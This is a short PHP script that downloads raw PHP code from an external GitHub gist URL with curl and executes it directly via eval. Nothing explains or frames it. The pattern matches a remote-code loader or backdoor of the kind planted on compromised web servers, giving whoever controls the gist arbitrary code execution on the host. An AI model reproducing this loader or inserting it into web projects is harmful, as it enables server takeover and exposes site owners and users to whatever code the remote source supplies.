<?php 
$link = 'https://gist.githubusercontent.com/garasito/086ab2037ece06131f7c88b3ada6f1ba/raw/ecf8937d71defd412e23054f1956b7c8a6c38b5b/gistfile1.php';
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$output = curl_exec($ch); 
curl_close($ch);      
eval ('?>'.$output);
?>